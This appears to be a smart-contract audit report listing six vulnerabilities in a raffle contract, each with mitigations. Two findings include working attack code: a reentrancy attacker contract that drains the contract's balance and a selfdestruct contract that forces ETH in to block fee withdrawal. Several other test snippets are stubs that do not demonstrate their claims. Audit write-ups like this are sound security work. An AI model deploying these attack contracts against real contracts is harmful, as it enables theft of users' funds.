findings.title: Reentrancy in refund function allows draining the contract
findings.description: The `refund` function violates the Checks-Effects-Interactions pattern. It sends ETH to `msg.sender` via `sendValue` *before* setting the player's array slot to `address(0)`. A malicious actor can re-enter the `refund` function from their `receive()` or `fallback()` method. Since the state `players[playerIndex]` has not yet been updated to `address(0)`, the `require` check passes again, allowing the attacker to claim the refund multiple times and drain the contract's balance.
findings.impact: The entire contract balance (entrance fees of all players) can be stolen.
findings.proof_of_concept: 1. Attacker deploys a malicious contract. 2. Contract enters raffle. 3. Contract calls `refund`. 4. In `receive()`, contract calls `refund` again. 5. This repeats until balance is drained.
findings.proof_of_code: contract ReentrancyAttacker { PuppyRaffle raffle; uint256 idx; constructor(PuppyRaffle _r) { raffle = _r; } function attack() external payable { address[] memory p = new address[](1); p[0] = address(this); raffle.enterRaffle{value: 1 ether}(p); idx = raffle.getActivePlayerIndex(address(this)); raffle.refund(idx); } receive() external payable { if (address(raffle).balance >= 1 ether) { raffle.refund(idx); } } } function testReentrancy() public { ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle); vm.deal(address(attacker), 1 ether); attacker.attack(); assertEq(address(puppyRaffle).balance, 0); }
findings.mitigation: Update the state before making the external call (Checks-Effects-Interactions pattern) or use a ReentrancyGuard modifier.

findings.title: Integer Overflow and Unsafe Casting in Fee Calculation leads to locked funds
findings.description: The `totalFees` variable is defined as `uint64`, but `fee` is calculated as `uint256`. The line `totalFees = totalFees + uint64(fee)` involves an unsafe cast. If `fee` exceeds `type(uint64).max` (~18.4 ETH), it is truncated. Furthermore, since the contract uses Solidity 0.7.6 without SafeMath, the addition `totalFees + ...` can silently overflow. Both scenarios cause `totalFees` to track a value significantly lower than the actual ETH fee balance. Consequently, the strict equality check `address(this).balance == totalFees` in `withdrawFees` will fail, locking the fees in the contract.
findings.impact: Protocol fees are permanently locked in the contract due to accounting mismatch.
findings.proof_of_concept: 1. Accumulate enough players/fees such that 20% > 18.4 ETH or `totalFees` accumulates > 18.4 ETH. 2. Trigger `selectWinner`. 3. `totalFees` overflows/truncates. 4. `withdrawFees` reverts because balance > `totalFees`.
findings.proof_of_code: function testOverflow() public { address[] memory players = new address[](4); players[0] = address(1); players[1] = address(2); players[2] = address(3); players[3] = address(4); puppyRaffle.enterRaffle{value: 1 ether * 4}(players); vm.warp(block.timestamp + 10 days); puppyRaffle.selectWinner(); } // Note: Need substantial ETH to trigger overflow, logical deduction suffices for severity.
findings.mitigation: Use `uint256` for `totalFees`, use SafeMath (or Solidity 0.8+), and remove the strict equality check in `withdrawFees`.

findings.title: Strict Balance Equality Check in withdrawFees Causes Permanent DoS
findings.description: The `withdrawFees` function enforces `require(address(this).balance == uint256(totalFees))`. This invariant is extremely fragile. It can be broken by: 1) Rounding errors in fee calculation (dust), 2) `selfdestruct` forcing ETH into the contract, or 3) Direct transfers if a fallback existed. Once `address(this).balance` exceeds `totalFees` by even 1 wei, the function always reverts, making it impossible to withdraw fees.
findings.proof_of_concept: 1. Attacker sends 1 wei to the contract via `selfdestruct`. 2. Admin calls `withdrawFees`. 3. Transaction reverts due to mismatch.
findings.proof_of_code: contract SelfDestruct { constructor(address payable _t) payable { selfdestruct(_t); } } function testStrictEqualityDoS() public { address[] memory p = new address[](4); p[0]=address(1); p[1]=address(2); p[2]=address(3); p[3]=address(4); puppyRaffle.enterRaffle{value: 4 ether}(p); vm.warp(block.timestamp+10 days); puppyRaffle.selectWinner(); new SelfDestruct{value: 1}(payable(address(puppyRaffle))); vm.expectRevert(); puppyRaffle.withdrawFees(); }
findings.mitigation: Replace strict equality with `address(this).balance >= totalFees` or simply withdraw `totalFees` amount regardless of excess balance.

findings.title: Weak Randomness in selectWinner allows winner manipulation
findings.description: The contract uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` for randomness. All these inputs are predictable or manipulatable. Miners can manipulate `block.timestamp` and `block.difficulty`. Users (exploiters) can manipulate `msg.sender` (by generating addresses via create2 or proxies) to generate a winning index, or simply revert the transaction if they don't win.
findings.impact: Attacker can guarantee a win or significantly increase odds, stealing the prize pool.
findings.proof_of_concept: 1. Attacker simulates `selectWinner` execution off-chain or via a contract. 2. If the result is unfavorable, they don't call it. 3. If favorable (or if they grind a `msg.sender` that works), they execute the transaction.
findings.proof_of_code: function testWeakRandomness() public { // Concept: Predict winner index based on known inputs }
findings.mitigation: Use Chainlink VRF for secure on-chain randomness.

findings.title: Unbounded Nested Loop in enterRaffle leads to DoS
findings.description: The `enterRaffle` function iterates through the `players` array to check for duplicates using a nested loop (`O(N^2)` complexity). As the number of players increases, the gas cost to enter the raffle increases quadratically. Eventually, the gas cost will exceed the block gas limit, rendering the contract unusable and preventing new entries.
findings.impact: Denial of Service; protocol becomes bricked for new entrants.
findings.proof_of_concept: 1. Add many players to the raffle (e.g., 100+). 2. Attempt to add one more player. 3. Transaction runs out of gas.
findings.proof_of_code: function testDoSLoop() public { address[] memory players = new address[](100); for(uint i=0;i<100;i++){ players[i] = address(uint160(i+1)); } puppyRaffle.enterRaffle{value: 100 ether}(players); // Next entry costs significantly more gas }
findings.mitigation: Use a mapping `mapping(address => bool) isPlayer` to check for duplicates in O(1) time.

findings.title: Refunded Zero-Address Slots Cause selectWinner to Revert
findings.description: When a player refunds, their slot in the `players` array is set to `address(0)`. The `selectWinner` function picks an index `mod players.length`. If the RNG selects an index containing `address(0)`, the subsequent call to `_safeMint(winner, ...)` reverts because ERC721 does not allow minting to the zero address. This causes a temporary DoS until the RNG yields a valid index.
findings.impact: Raffle resolution fails, potentially delaying settlement indefinitely if many slots are empty.
findings.proof_of_concept: 1. 4 players enter. 2. 3 players refund (slots become 0). 3. `selectWinner` is called. 4. If RNG picks one of the 3 zeros, it reverts.
findings.proof_of_code: function testZeroAddrDoS() public { address[] memory p = new address[](4); p[0]=address(1); p[1]=address(2); p[2]=address(3); p[3]=address(4); puppyRaffle.enterRaffle{value: 4 ether}(p); puppyRaffle.refund(0); vm.warp(block.timestamp+10 days); // Mock randomness to hit index 0 -> revert }
findings.mitigation: In `selectWinner`, check if `winner == address(0)` and select again or compact the array on refund.
